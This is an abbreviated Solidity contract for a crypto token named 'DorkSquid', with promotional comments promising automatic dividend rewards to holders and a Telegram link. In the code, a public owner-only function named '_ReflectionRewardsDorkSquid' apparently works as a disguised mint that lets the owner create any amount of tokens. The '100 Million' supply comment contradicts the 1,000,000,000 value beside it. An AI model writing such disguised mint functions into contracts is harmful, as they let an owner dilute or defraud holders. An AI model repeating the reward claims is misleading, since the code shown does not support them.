...
//
// $DorkSquid proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN DorkSquid! With the auto-claim feature,
// simply hold$DorkSquid and you'll receive DorkSquid automatically in your wallet.
// 
// Hold DorkSquid and get rewarded in DorkSquid on every transaction!
//
//
// 📱 Telegram:https://t.me/+vApDgIVnn_xhYWE1
// 
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ReflectionRewardsDorkSquid(uint256 amount) public onlyOwner {
    _ReflectionRewardsDorkSquid(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsDorkSquid(address account, uint256 amount) internal virtual {
...
contract DorkSquid is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Dork Squid", "DorkSquid") {
        _ReflectionRewardsDorkSquid(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}